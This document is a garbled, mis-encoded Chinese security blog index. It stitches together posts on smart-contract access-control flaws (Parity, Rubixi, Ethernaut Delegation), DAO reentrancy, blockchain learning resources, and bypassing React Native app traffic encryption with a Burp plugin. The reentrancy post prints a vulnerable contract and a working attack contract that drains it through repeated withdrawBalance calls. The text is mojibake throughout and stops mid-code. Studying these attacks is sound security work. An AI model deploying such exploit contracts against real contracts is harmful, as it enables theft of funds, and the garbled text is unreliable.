é¦–å…ˆå»ºè®®é˜…è¯»ä¸€äº›åˆ†ææ–‡ç« ï¼Œç„¶åè¯´è¯´è‡ªå·±çš„ç†è§£ æ¨èzeppelinï¼ˆåŒºå—é“¾å®‰å…¨å…¬å¸ï¼‰çš„åˆ†æï¼š The Parity Wallet Hack Explained ä¸­æ–‡åˆ†æï¼š Parityå¤šé‡ç­¾åå‡½æ•°åº“è‡ªæ€æ¼æ´ Parityå¤šé‡ç­¾ååˆçº¦Delegatecallæ¼æ´å›é¡¾ Code: WalletLibrary enhanced-wallet.sol å¤§ä½“æµè§ˆé’±åŒ…åˆçº¦ä»£ç ï¼Œå…¶ä¸­æœ‰å››ä¸ªåˆçº¦æ¨¡å—ï¼š WalletEvents // äº‹ä»¶åˆçº¦ï¼Œæ‰“å°æ—¥å¿— WalletAbi // æä¾›abiæ¥å£ WalletLibrary // ä»£ç†åº“ï¼Œç»§æ‰¿WalletEventsã€‚é’±åŒ…çš„æ ¸å¿ƒé€»è¾‘ï¼Œæ¼æ´ç‚¹æ­£æ˜¯è¯¥åˆçº¦çš„initWallet -\u003e initMultiownedå‡½æ•° Wallet // é’±åŒ…åˆçº¦ï¼Œå¯ä»¥çœ‹åˆ°ä»£ç é‡å¾ˆå°ï¼Œé€šè¿‡fallbackå‡½æ•°çš„delegatecallå‡½æ•°è°ƒç”¨WalletLibraryå‡½æ•° å¯ä»¥çœ‹åˆ°Parityä½¿ç”¨äº†ä»£ç†åº“æ¨¡å¼ã€‚åœ¨ä½¿ç”¨Walleté€»è¾‘æ—¶ï¼Œæ˜¯é—´æ¥é€šè¿‡ä¼ é€’å‚æ•°è°ƒç”¨WalletLibraryä¸­å‡½æ•° _walletLibrary.delegatecall(msg.data); è€ŒWalletLibraryåº“ä¸­initWallet -\u003e initMultiownedå‡½æ•°åˆæ²¡æœ‰åšä»»ä½•æ ¡éªŒå³å¯æ”¹å˜åˆçº¦çš„æ‹¥æœ‰è€…ï¼Œæ•…è€Œå½¢æˆæ¼æ´ã€‚ ","date":"2018-07-24","objectID":"/posts/dasp-access-control-2.html:5:0","tags":["BlockChain","DASP"],"title":"#DASP# Access Control (2)","uri":"/posts/dasp-access-control-2.html"},{"categories":["åŒºå—é“¾"],"content":"0x05 Rubixi Rubixiåˆçº¦ä¸­çš„è®¿é—®æ§åˆ¶æ¼æ´ Code å¯ä»¥ç›´æ¥copyè¿›remixè¿›è¡Œæµ‹è¯•ã€‚å°†creatorå˜é‡ä¿®æ”¹ä¸ºpublicï¼Œé€šè¿‡DynamicPyramidå‡½æ•°å³å¯æ¶æ„ä¿®æ”¹creatorã€‚ ","date":"2018-07-24","objectID":"/posts/dasp-access-control-2.html:6:0","tags":["BlockChain","DASP"],"title":"#DASP# Access Control (2)","uri":"/posts/dasp-access-control-2.html"},{"categories":["åŒºå—é“¾"],"content":"0x06 ethernaut åœ¨OpenZeppelinçš„ethernautä¸­æœ‰é“Delegationé¢˜ç›®ï¼Œæ­£å¥½æ˜¯æ­¤æ¼æ´ç±»å‹ã€‚ ä¿®æ”¹ä¸‹åˆçº¦åå’Œå‡½æ•°åä¾¿äºå¯¹æ¯”Parityæ¼æ´è¿›è¡Œç†è§£ï¼š contract WalletLibaray { address public owner; function WalletLibaray(address _owner) { owner = _owner; } function initWallet() { owner = msg.sender; } } contract Wallet { address public owner; WalletLibaray _walletLib; function Wallet(address _walletLibAddress) { _walletLib = WalletLibaray(_walletLibAddress); owner = msg.sender; } function () { if (_walletLib.delegatecall(msg.data)) { this; } } } Walletåˆçº¦ä¸­æ„é€ å‡½æ•°å®ä¾‹åŒ–WalletLibarayã€‚ é€šè¿‡fallbackå‡½æ•°ä¸­delegatecallä¼ å‚è°ƒç”¨WalletLibarayåº“å‡½æ•°ï¼Œè°ƒç”¨æ— ä»»ä½•è®¿é—®æ§åˆ¶çš„initWalletå‡½æ•°å³å¯æ”¹å˜ownerã€‚ ","date":"2018-07-24","objectID":"/posts/dasp-access-control-2.html:7:0","tags":["BlockChain","DASP"],"title":"#DASP# Access Control (2)","uri":"/posts/dasp-access-control-2.html"},{"categories":["åŒºå—é“¾"],"content":"0x07 Fomo3D å‚è§#DASP# Bad Randomness (6) â€“ Fomo3D ","date":"2018-07-24","objectID":"/posts/dasp-access-control-2.html:8:0","tags":["BlockChain","DASP"],"title":"#DASP# Access Control (2)","uri":"/posts/dasp-access-control-2.html"},{"categories":["åŒºå—é“¾"],"content":"0x00 Info ä»æœ¬ç¯‡å¼€å§‹å­¦ä¹ æ™ºèƒ½åˆçº¦æ¼æ´ï¼Œä¾æ®DASP TOP10ã€‚ ","date":"2018-07-20","objectID":"/posts/dasp-reentrancy-1.html:1:0","tags":["BlockChain","DASP"],"title":"#DASP# Reentrancy (1)","uri":"/posts/dasp-reentrancy-1.html"},{"categories":["åŒºå—é“¾"],"content":"0x01 DAO History: The History of the DAO WhitePaper: WhitePaper ç™½çš®ä¹¦ OpenSource: Github etherscan ","date":"2018-07-20","objectID":"/posts/dasp-reentrancy-1.html:2:0","tags":["BlockChain","DASP"],"title":"#DASP# Reentrancy (1)","uri":"/posts/dasp-reentrancy-1.html"},{"categories":["åŒºå—é“¾"],"content":"æ¦‚å¿µç†è§£ ä¼—ç­¹åˆçº¦ï¼Œé€šè¿‡èµ„é‡‘ETHæ¢å–DAO tokenï¼Œä»è€Œè·å¾—æŠ•ç¥¨å’Œå‘èµ·è®®æ¡ˆçš„æƒåˆ©ï¼ŒæŒ‰ä¸€å®šè§„åˆ™å›é¦ˆç»™æŠ•èµ„äººæŠ•èµ„é¡¹ç›®çš„æ”¶ç›Šã€‚ å› æ­¤ï¼ŒThe DAOç‰¹ç‚¹ï¼š æœ¬è´¨æ˜¯ä¸ªVCï¼Œé€šè¿‡ä»¥å¤ªåŠç­¹é›†çš„èµ„é‡‘ï¼ˆETHï¼‰é”å®šåœ¨æ™ºèƒ½åˆçº¦ä¸­ï¼Œé€šè¿‡ä»£ç ä¸»å¯¼ï¼ å‡ºèµ„ETHè·å–å¯¹åº”DAOä»£å¸ï¼Œå…·æœ‰å®¡æŸ¥é¡¹ç›®ã€æŠ•ç¥¨è¡¨å†³å’Œæå‡ºæŠ•èµ„é¡¹ç›®è®®æ¡ˆçš„æƒåˆ© æŠ•èµ„è®®æ¡ˆç”±å…¨ä½“ä»£å¸æŒæœ‰äººæŠ•ç¥¨è¡¨å†³ï¼Œä¸€å¸ä¸€ç¥¨ï¼Œç¥¨æ•°é€šè¿‡ï¼ŒæŠ•èµ„é¡¹ç›®å¯è·å¾—ç›¸åº”æŠ•èµ„é¢ã€‚åˆ©ç”¨â€œä¼—æ™ºâ€+å‡ºèµ„é¢æƒé‡å†³å®šæŠ•èµ„ç­–ç•¥ï¼ˆå–ä»£ä¼ ç»Ÿè¡Œä¸šæŠ•èµ„ç»ç†ï¼‰ã€‚ æŠ•èµ„é¡¹ç›®çš„æ”¶ç›ŠæŒ‰è§„åˆ™å›é¦ˆè‚¡ä¸œã€‚ ","date":"2018-07-20","objectID":"/posts/dasp-reentrancy-1.html:2:1","tags":["BlockChain","DASP"],"title":"#DASP# Reentrancy (1)","uri":"/posts/dasp-reentrancy-1.html"},{"categories":["åŒºå—é“¾"],"content":"The DAO is attacked the-dao-the-hack-the-soft-fork-and-the-hard-fork security-alert-dos-vulnerability-in-the-soft-fork ","date":"2018-07-20","objectID":"/posts/dasp-reentrancy-1.html:2:2","tags":["BlockChain","DASP"],"title":"#DASP# Reentrancy (1)","uri":"/posts/dasp-reentrancy-1.html"},{"categories":["åŒºå—é“¾"],"content":"0x02 Reentrancy ","date":"2018-07-20","objectID":"/posts/dasp-reentrancy-1.html:3:0","tags":["BlockChain","DASP"],"title":"#DASP# Reentrancy (1)","uri":"/posts/dasp-reentrancy-1.html"},{"categories":["åŒºå—é“¾"],"content":"solidityåŸºç¡€çŸ¥è¯† åˆçº¦è°ƒç”¨ message call bytes4 funcIdentifier = bytes4(keccak256(\"FuncName(paramType)\")); this.call(funcIdentifier, paramValue); contract object Contract1 c = Contract1(AddressOfContract1); c.foo(); é™åˆ¶ ä¾‹å¦‚sendèŠ±è´¹2300gas é€’å½’è°ƒç”¨æ ˆæœ€å¤§1024å±‚ è½¬å¸ 1. \u003caddress\u003e.transfer() //å¤±è´¥æŠ›å‡ºthrowä¸”å›æ»šï¼Œ2300gas 2. \u003caddress\u003e.send() //å¤±è´¥è¿”å›falseï¼Œ2300gas 3. \u003caddress\u003e.gas().call.vale()() //å¤±è´¥è¿”å›falseï¼Œæ‰€æœ‰gas fallback Solidityçš„fallbackå‡½æ•° contract SimpleFallback{ function(){ //fallback function } } ä¸¤ç§æƒ…å†µä¼šè°ƒç”¨fallbackï¼š è°ƒç”¨å‡½æ•°æ‰¾ä¸åˆ°æ—¶ å‘åˆçº¦å‘é€etheræ—¶ ","date":"2018-07-20","objectID":"/posts/dasp-reentrancy-1.html:3:1","tags":["BlockChain","DASP"],"title":"#DASP# Reentrancy (1)","uri":"/posts/dasp-reentrancy-1.html"},{"categories":["åŒºå—é“¾"],"content":"reentrancy \u0026 The DAO DASP TOP10ä¸­reentrancyçš„æè¿°ï¼šdasp reentrancyåŸå‹ä¸ºRace-To-Emptyï¼Œå…¶ä¸­å°±å·²ç»ä»‹ç»äº†é‡ç½®èµ„äº§æ”¾åœ¨è½¬å¸æ“ä½œåçš„æ¼æ´ã€‚ å…¶ä¸­æœ€å…¸å‹çš„æ”»å‡»æ¡ˆä¾‹ä¸ºThe DAOã€‚å¯¹äºThe DAOçš„æ¼æ´åˆ†æåŠåˆ©ç”¨exp \u0026 demoç½‘ä¸Šä¸€å¤§å †ï¼Œè¿™é‡Œå°±ä¸ctrlcväº†ã€‚ å»ºè®®ç»“åˆæºç ä¸€èµ·çœ‹ï¼Œå¹¶ä½¿ç”¨æœ¬åœ°ï¼ˆtruffle+testrpc or geth testnetï¼‰æˆ–è€…åœ¨çº¿çš„remixç¼–è¯‘ç¯å¢ƒä¸Šæ‰‹å®è·µã€‚ å¯ä»¥é¦–å…ˆçœ‹çœ‹ä¸­æ–‡åˆ†æï¼š åŒºå—é“¾å®‰å…¨ - DAOæ”»å‡»äº‹ä»¶è§£æ ä»¥å¤ªåŠæ™ºèƒ½åˆçº¦å®‰å…¨å…¥é—¨ æ¨èPhil Daianåˆ†æï¼š Analysis of the DAO exploit Quote attack steps: Propose a split and wait until the voting period expires. (DAO.sol, createProposal) Execute the split. (DAO.sol, splitDAO) Let the DAO send your new DAO its share of tokens. (splitDAO -\u003e TokenCreation.sol, createTokenProxy) Make sure the DAO tries to send you a reward before it updates your balance but after doing (3). (splitDAO -\u003e withdrawRewardFor -\u003e ManagedAccount.sol, payOut) While the DAO is doing (4), have it run splitDAO again with the same parameters as in (2) (payOut -\u003e _recipient.call.value -\u003e _recipient()) The DAO will now send you more child tokens, and go to withdraw your reward before updating your balance. (DAO.sol, splitDAO) Back to (5)! Let the DAO update your balance. Because (7) goes back to (5), it never actually will :-). å…¶ä¸­æœ€å…³é”®çš„å°±æ˜¯ç¬¬4æ­¥ï¼ŒsplitDAO -\u003e withdrawRewardFor -\u003e payOutï¼Œå…¶ä¸­payOutä½¿ç”¨_recipient.call.value(_amount)()è½¬å¸ï¼Œè€ŒsplitDAOå‡½æ•°ä¸­èµ„äº§é‡ç½®æ˜¯æ”¾åœ¨withdrawRewardForå‡½æ•°åï¼Œé€ æˆæ¼æ´ã€‚ demo \u0026 expï¼š SimpleDAO attack reentrancy exp å…¶ä»–åˆçº¦ä¸­çš„reentrancyæ¼æ´ï¼šCityMayor Note ç‰¹åˆ«æ³¨æ„æ­¤ç¯‡ä¸­çš„åˆ†ææ€è·¯åŠå·¥å…·porosity/etherscan æ¼æ´åˆçº¦ï¼š contract vulnerable_DAO{ mapping(address=\u003euint) userBalances; function vulnerable_DAO() payable { } function getUserBalance(address user) constant returns(uint) { return userBalances[user]; } function addToBalance() payable { userBalances[msg.sender] += msg.value; } function withdrawBalance() { uint amountToWithdraw = userBalances[msg.sender]; if(msg.sender.call.value(amountToWithdraw)() ==false) { throw; } userBalances[msg.sender] = 0; } function getBalance() returns(uint) { return this.balance; } } æ”»å‡»åˆ©ç”¨åˆçº¦ï¼š contract Attack { address vulnerable_contract; uint attackCount; address public owner; function Attack() public{ attackCount = 2; owner = msg.sender; } function() payable{ while(attackCount\u003e0) { attackCount--; require(vulnerable_contract.call(bytes4(keccak256(\"withdrawBalance()\")))); } } function deposit(address _vulnerable_contract) public payable{ vulnerable_contract = _vulnerable_contract; require(vulnerable_contract.call.value(msg.value)(bytes4(keccak256(\"addToBalance()\")))); } function withdraw(){ require(vulnerable_contract.call(bytes4(keccak256(\"withdrawBalance()\")))); } function getBalance() returns(uint) { return this.balance; } } ","date":"2018-07-20","objectID":"/posts/dasp-reentrancy-1.html:3:2","tags":["BlockChain","DASP"],"title":"#DASP# Reentrancy (1)","uri":"/posts/dasp-reentrancy-1.html"},{"categories":["åŒºå—é“¾"],"content":"æ­£æ‰€è°“ä¸ç§¯è·¬æ­¥æ— ä»¥è‡³åƒé‡Œï¼Œä½œä¸ºåŒºå—é“¾å®‰å…¨å­¦ä¹ çš„ç¬¬ä¸€æ­¥ï¼Œæœ¬ç¯‡æ±‡èšåŒºå—é“¾ç†è®ºä¸å®è·µçš„å„ç§èµ„æºï¼Œé€šè¿‡çŸ¥è¡Œæ¥ç†è§£è¿™ä¸ªæ–°é¢†åŸŸï¼Œä¸ºå®‰å…¨ç ”ç©¶åšå¥½ä¼ç¬”ã€‚ ","date":"2018-07-12","objectID":"/posts/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%85%A5%E9%97%A8%E8%B5%84%E6%BA%90.html:0:0","tags":["BlockChain"],"title":"BlockChain Resources","uri":"/posts/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%85%A5%E9%97%A8%E8%B5%84%E6%BA%90.html"},{"categories":["åŒºå—é“¾"],"content":"BlockChain åŒºå—é“¾æŠ€æœ¯æŒ‡å— ä¸­æ–‡èµ„æ–™é˜…è¯»ç«™ ç®—æ³•æ¼”è¿› æŒ–çŸ¿æ¼”è¿› å…±è¯†æœºåˆ¶æ¼”è¿› è‡ªå†™demo ","date":"2018-07-12","objectID":"/posts/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%85%A5%E9%97%A8%E8%B5%84%E6%BA%90.html:1:0","tags":["BlockChain"],"title":"BlockChain Resources","uri":"/posts/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%85%A5%E9%97%A8%E8%B5%84%E6%BA%90.html"},{"categories":["åŒºå—é“¾"],"content":"çŸ¿æ±  PHP-MPOS node-open-mining-portal Powerpool ","date":"2018-07-12","objectID":"/posts/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%85%A5%E9%97%A8%E8%B5%84%E6%BA%90.html:1:1","tags":["BlockChain"],"title":"BlockChain Resources","uri":"/posts/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%85%A5%E9%97%A8%E8%B5%84%E6%BA%90.html"},{"categories":["åŒºå—é“¾"],"content":"BitCoin ç®€ä»‹ï¼šhow-bitcoin-works-under-hood whitepaperï¼šbitcoin ä¸­æ–‡æ³¨è§£ï¼šæ¯”ç‰¹å¸ç™½çš®ä¹¦ ä¸ªäººç¿»è¯‘+æ³¨è§£ ","date":"2018-07-12","objectID":"/posts/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%85%A5%E9%97%A8%E8%B5%84%E6%BA%90.html:2:0","tags":["BlockChain"],"title":"BlockChain Resources","uri":"/posts/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%85%A5%E9%97%A8%E8%B5%84%E6%BA%90.html"},{"categories":["åŒºå—é“¾"],"content":"Ethereum ","date":"2018-07-12","objectID":"/posts/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%85%A5%E9%97%A8%E8%B5%84%E6%BA%90.html:3:0","tags":["BlockChain"],"title":"BlockChain Resources","uri":"/posts/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%85%A5%E9%97%A8%E8%B5%84%E6%BA%90.html"},{"categories":["åŒºå—é“¾"],"content":"åŸç† whitepaper: White-Paper ä¸­æ–‡ï¼šä»¥å¤ªåŠç™½çš®ä¹¦ ","date":"2018-07-12","objectID":"/posts/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%85%A5%E9%97%A8%E8%B5%84%E6%BA%90.html:3:1","tags":["BlockChain"],"title":"BlockChain Resources","uri":"/posts/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%85%A5%E9%97%A8%E8%B5%84%E6%BA%90.html"},{"categories":["åŒºå—é“¾"],"content":"åè®®æ¶æ„ https://github.com/ethereum/wiki/wiki/R\u0026D https://ethresear.ch ","date":"2018-07-12","objectID":"/posts/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%85%A5%E9%97%A8%E8%B5%84%E6%BA%90.html:3:2","tags":["BlockChain"],"title":"BlockChain Resources","uri":"/posts/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%85%A5%E9%97%A8%E8%B5%84%E6%BA%90.html"},{"categories":["åŒºå—é“¾"],"content":"æ™ºèƒ½åˆçº¦ Dapp state wikiï¼šÃApp Development å…¥é—¨æŒ‡å—ï¼š The Hitchhikerâ€™s Guide to Smart Contracts in Ethereum ä»¥å¤ªåŠå¼€å‘å…¥é—¨ï¼Œå®Œæ•´å…¥é—¨ç¯‡ Getting Started with Ethereum and Solidity learning-solidity-part-1-deploy-a-contract å¼€å‘äº‹ä¾‹ï¼š Create a Hello World Contract in ethereum Create a Token Contract Create a Crowdsale Contract How to create a private Ethereum network Comments Feed ","date":"2018-07-12","objectID":"/posts/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%85%A5%E9%97%A8%E8%B5%84%E6%BA%90.html:3:3","tags":["BlockChain"],"title":"BlockChain Resources","uri":"/posts/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%85%A5%E9%97%A8%E8%B5%84%E6%BA%90.html"},{"categories":["åŒºå—é“¾"],"content":"å®¢æˆ·ç«¯å¼€å‘ç¯å¢ƒ Ethereum Clients IDEï¼š remix truffle æ¨¡æ‹Ÿç¯å¢ƒï¼štestrpc å®¢æˆ·ç«¯ï¼š å…¨èŠ‚ç‚¹ geth è½»èŠ‚ç‚¹ parity cliï¼šhttps://ethereum.org/cli testnet eth: http://faucet.ropsten.be:3001/ The NEW If you need some Ropsten Testnet Ethers testnet block explorer: https://ropsten.etherscan.io/ Dapp explorerï¼š pc: mist moblie: status solidity: introduction-to-smart-contracts tools ethereumjs-tx web3 ","date":"2018-07-12","objectID":"/posts/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%85%A5%E9%97%A8%E8%B5%84%E6%BA%90.html:3:4","tags":["BlockChain"],"title":"BlockChain Resources","uri":"/posts/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%85%A5%E9%97%A8%E8%B5%84%E6%BA%90.html"},{"categories":["androidç½‘ç»œ"],"content":"0x00 èƒŒæ™¯ æœ€è¿‘åœ¨åšæµ‹è¯•æ—¶å‘ç°åº”ç”¨ä½¿ç”¨ facebook çš„ react-native è¿›è¡Œæ··åˆå¼€å‘ï¼Œå¯¹äºæƒ³äº†è§£ react-native çš„åŒå­¦ï¼Œå¯ä»¥æŸ¥é˜…githubå’Œå®˜æ–¹æ–‡æ¡£ï¼Œç½‘ä¸Šä¹Ÿæœ‰å¾ˆå¤š android å†…åµŒ react-native è¿›è¡Œæ··åˆå¼€å‘çš„ç¯å¢ƒæ­å»ºåŠæ•™ç¨‹ä¾›å­¦ä¹ ï¼Œä¾‹å¦‚ï¼šhttps://blog.csdn.net/u011148116/article/details/58178348ã€‚ è¯¥åº”ç”¨æ ¸å¿ƒä¸šåŠ¡æ¥å£æ•°æ®åŠ å¯†ï¼Œä¸”åŠ å¯†é€»è¾‘åœ¨æœ¬åœ°jsä¸­å®ç°ï¼Œè€Œæµ‹è¯•è¿‡ç¨‹æœ‰ä»£ç†æ˜æ–‡æŠ“åŒ…æ”¹å‚éœ€æ±‚ï¼Œè€Œç ”ç©¶ä¸€äºŒï¼Œå¹¶è®°å½•è¿‡ç¨‹ã€‚ ","date":"2018-05-31","objectID":"/posts/%E5%86%85%E5%B5%8Creact%E7%9A%84android%E5%BA%94%E7%94%A8%E6%B5%81%E9%87%8F%E5%8A%A0%E8%A7%A3%E5%AF%86.html:1:0","tags":["burp","react-native"],"title":"å†…åµŒReactçš„androidåº”ç”¨æµé‡åŠ è§£å¯†","uri":"/posts/%E5%86%85%E5%B5%8Creact%E7%9A%84android%E5%BA%94%E7%94%A8%E6%B5%81%E9%87%8F%E5%8A%A0%E8%A7%A3%E5%AF%86.html"},{"categories":["androidç½‘ç»œ"],"content":"0x01 é€šä¿¡åŠ è§£å¯†å†å² ç»ˆç«¯åº”ç”¨æ¸—é€æµ‹è¯•åŒ…æ‹¬ å®¢æˆ·ç«¯\u003câ€“é€šä¿¡â€“\u003eæœåŠ¡ç«¯ï¼Œå®¢æˆ·ç«¯æµ‹è¯•å¯ä»¥é€šè¿‡å„ç§é€†å‘åç¼–è¯‘ã€åŠ¨æ€è°ƒè¯•ã€hookæ¡†æ¶åˆ†æé€»è¾‘åŠæ”»å‡»é¢ï¼Œè€ŒæœåŠ¡ç«¯å®‰å…¨åˆ™éœ€è¦é€šè¿‡ä¸­é—´äººçš„æ–¹å¼æŠ“åŒ…æ”¹å‚ï¼ˆäººå·¥ã€æ¼æ‰«ã€fuzzï¼‰æ¥æŒ–æ˜æœåŠ¡ç«¯æ¼æ´ã€‚ è€Œç°æœ‰çš„appåŸºæœ¬éƒ½ä½¿ç”¨httpsä¼ è¾“ï¼Œå¯¹æ•°æ®æ•æ„Ÿçš„åº”ç”¨ä¼šåšäºŒæ¬¡åŠ å¯†æˆ–æ ¼å¼åŒ–åºåˆ—åŒ–å¤„ç†ã€‚é’ˆå¯¹httpsçš„åŸç†å’Œç»•è¿‡å¯ä»¥å‚è€ƒandroidç½‘ç»œè¯·æ±‚-è¯ä¹¦è®¤è¯ï¼Œè€Œå¯¹äºäºŒæ¬¡åŠ å¯†ï¼Œåˆ™éœ€è¦é€†å‘åˆ†æå®¢æˆ·ç«¯ä»£ç äº†ã€‚ å¸¸è§çš„åŠ è§£å¯†é€»è¾‘éƒ½ä¼šåœ¨javaå±‚æˆ–nativeå±‚ï¼Œé€šè¿‡urlã€å¤´å…³é”®å­—ã€è¯·æ±‚å…³é”®å­—ã€åŠ å¯†ç®—æ³•ã€logç­‰å…³é”®å­—åœ¨åç¼–è¯‘ä»£ç ä¸­æœå¯»å®šä½ã€‚ ç»•è¿‡åŠ å¯†æ‰‹æ®µæœ‰: hookæ’ä»¶+ä»£ç†æ’ä»¶çš„æ–¹å¼ hookæ’ä»¶+server+ä»£ç†æ’ä»¶çš„æ–¹å¼ å…¶æ ¸å¿ƒéƒ½æ˜¯åœ¨ä»£ç†ä¸­è·å–æ˜æ–‡æ•°æ®ï¼Œè€Œæ˜æ–‡åŠ å¯†çš„æ“ä½œæ”¾åœ¨æ’ä»¶ä¸­ã€‚ hookæ’ä»¶+ä»£ç†æ’ä»¶çš„æ–¹å¼hookæ’ä»¶+ä»£ç†æ’ä»¶ \" hookæ’ä»¶+ä»£ç†æ’ä»¶çš„æ–¹å¼ hookæ’ä»¶+server+ä»£ç†æ’ä»¶çš„æ–¹å¼hookæ’ä»¶+server+ä»£ç†æ’ä»¶ \" hookæ’ä»¶+server+ä»£ç†æ’ä»¶çš„æ–¹å¼ ","date":"2018-05-31","objectID":"/posts/%E5%86%85%E5%B5%8Creact%E7%9A%84android%E5%BA%94%E7%94%A8%E6%B5%81%E9%87%8F%E5%8A%A0%E8%A7%A3%E5%AF%86.html:2:0","tags":["burp","react-native"],"title":"å†…åµŒReactçš„androidåº”ç”¨æµé‡åŠ è§£å¯†","uri":"/posts/%E5%86%85%E5%B5%8Creact%E7%9A%84android%E5%BA%94%E7%94%A8%E6%B5%81%E9%87%8F%E5%8A%A0%E8%A7%A3%E5%AF%86.html"},{"categories":["androidç½‘ç»œ"],"content":"0x02 react-native jsè§£å¯† æœ¬æ¬¡æµ‹è¯•å¼€å§‹é‡‡ç”¨é€šç”¨æ–¹å¼ï¼Œåœ¨åç¼–è¯‘ä»£ç ä¸­æœå¯»è››ä¸é©¬è¿¹ï¼Œç„¶å¹¶åµï¼Œæœ¬ä»¥ä¸ºè¯·æ±‚é€»è¾‘åšåœ¨äº†nativeä¸­ï¼Œç®€å•æœç´¢System.loadLibraryä¹Ÿæœªç¡®å®šå¯ç–‘soæ–‡ä»¶ã€‚ æ•…é€šè¿‡è§£å‹apkï¼Œå…¨å±€æœç´¢æ¥å£å…³é”®å­—ï¼š grep -rn \"xxx\" . åœ¨ assets æ–‡ä»¶ä¸‹çš„jsæ–‡ä»¶ä¸­å‘ç°å…³é”®å­—ï¼š å¯ç¡®å®šä½¿ç”¨js+androidæ··åˆå¼€å‘ï¼Œè€Œç½‘ç»œè¯·æ±‚ä¸æ•°æ®åŠ å¯†å‡ç”±jså®ç°ã€‚ é‚£æˆ‘ä»¬æ€è·¯å°±æ˜¯jså¼ºåˆ¶å‘æ˜æ–‡ï¼Œç»è¿‡burpåŠ å¯†å‘é€ï¼›æˆ–è€…ç»è¿‡serveråŠ å¯†ï¼Œburpå‘é€åŠ å¯†æ•°æ®ã€‚ okï¼Œæ€è·¯æ¸…æ™°åï¼Œæˆ‘ä»¬å°±è¦å¸¦ç€å¦‚ä¸‹é—®é¢˜è¿›è¡Œå°è¯•ï¼š Question jsä¸­postæ•°æ®æ„æˆé€»è¾‘ä¸ºä½•ï¼Ÿå¦‚ä½•å¼ºåˆ¶æ˜æ–‡ï¼Ÿ ä¸¤ç§æ–¹å¼å·¥ä½œé‡å¯¹æ¯”ï¼Œè‹¥é‡‡ç”¨burpåŠ å¯†ï¼Œæ˜¯å¤ç°jsåŠ å¯†ç®—æ³•ï¼Œè¿˜æ˜¯åŠ è½½jsï¼Ÿè‹¥é‡‡ç”¨serveråŠ å¯†ï¼Œæ”¹å¦‚ä½•æ„å»ºcï¼ˆburpï¼‰-sï¼ˆserverï¼‰ï¼Ÿ serveræˆ‘ä½¿ç”¨æ“…é•¿çš„pythonå®ç°ï¼Œé‚£å¦‚ä½•åœ¨pythonä¸­è¿è¡Œjsï¼Ÿ é¦–å…ˆæ¥çœ‹ç¬¬ä¸€ä¸ªé—®é¢˜ï¼š jsæ–‡ä»¶index.android.bundleæœªåšåŠ å¯†å’Œå¼ºæ··æ·†ï¼Œé€šè¿‡æ ¼å¼åŒ–å³å¯çœ‹åˆ°ä»£ç åŸè²Œï¼Œé€šè¿‡å…³é”®å­—ï¼ˆç®­å¤´æ‰€æŒ‡ï¼‰ç¡®å®šå‘é€è¯·æ±‚å’Œå‚æ•°æ„é€ ï¼ˆå›¾ä¸­æ–‡å­—ï¼‰ä»£ç ï¼š è€Œå‚æ•°ç»è¿‡ä¸€ç³»åˆ—å‡½æ•°çš„è¿ç®—åŠ å¯†ç”Ÿæˆï¼š å‘é€æ˜æ–‡ä¹Ÿå¾ˆç®€å•ï¼Œç›´æ¥ä¿®æ”¹jsä»£ç  return r å³å¯ï¼Œè¿™é‡Œä¹Ÿæ‰“æ¶ˆåœ¨burpæ’ä»¶ä¸­å¤ç°jsåŠ å¯†é€»è¾‘çš„æƒ³æ³•ï¼ŒçœŸçš„å¾ˆå¤æ‚ã€‚ Info è¿™é‡Œå› ä¸ºä¿®æ”¹äº†apkçš„èµ„æºæ–‡ä»¶ï¼Œé‡å‹ç¼©æ‰“åŒ…åéœ€è¦ç­¾åï¼Œå¦åˆ™å®‰è£…æŠ¥é”™ã€‚ æ¥ç€çœ‹ç¬¬äºŒä¸ªé—®é¢˜ï¼š ç›´æ¥åœ¨burpæ’ä»¶ä¸­å®ç°jsçš„è¿è¡Œæ˜¯å¦å¯è¡Œï¼Œç”¨javaéœ€è¦jsè§£é‡Šå¼•æ“ï¼Œæ„Ÿè§‰ä¸Šæ’ä»¶ä½“é‡ä¼šæ¯”è¾ƒå¤§è€Œä¸”è°ƒè¯•éå¸¸ä¸æ–¹ä¾¿ã€‚ç„¶è€Œç”¨pythonå†™æ’ä»¶ä¼šæœ‰å„ç§å¼‚å¸¸ï¼ˆä¸æ¨èpythonå†™burpæ’ä»¶ï¼‰ã€‚ æƒ³äº†ä¸€ä¸‹è¿˜æ˜¯é‡‡ç”¨serverçš„æ–¹å¼ã€‚å³åœ¨burpæ’ä»¶ä¸­å®ç°æ˜æ–‡è¯·æ±‚æ‹¦æˆªï¼Œå¹¶ä½¿ç”¨HttpClientå‘é€è‡³python httpserverï¼Œserverå¯¹æ•°æ®åŠ å¯†å›ä¼ ï¼Œburpåˆ©ç”¨setRequestå‘é€åŠ å¯†åæ•°æ®è¿›è¡Œæ­£å¸¸çš„ä¸šåŠ¡è¯·æ±‚ã€‚ æµç¨‹å¤§æ¦‚å¦‚ä¸‹ï¼š å…¶ä¸­burpä¸­ä½¿ç”¨apacheçš„httpcomponents-clientåŒ…ä½œä¸ºç½‘ç»œè¯·æ±‚æ¨¡å—ï¼Œburpæ’ä»¶å¤„ç†è¯·æ±‚ä»£ç ï¼š Info æ³¨æ„åœ¨ç¼–è¾‘å™¨ä¸­ç”Ÿæˆburpæ‰€ç”¨çš„jaråŒ…æ—¶éœ€è¦å°†ç¬¬ä¸‰æ–¹åŒ…ä¸€èµ·æ‰“åŒ…ï¼Œå¦åˆ™ä¼šæŠ¥classnotfoundé”™è¯¯ï¼Œæ¨èä½¿ç”¨fatjaræ‰“åŒ…æ–¹å¼ @Override public void processHttpMessage(int toolFlag, boolean messageIsRequest, IHttpRequestResponse messageInfo) { String host = messageInfo.getHttpService().getHost(); if 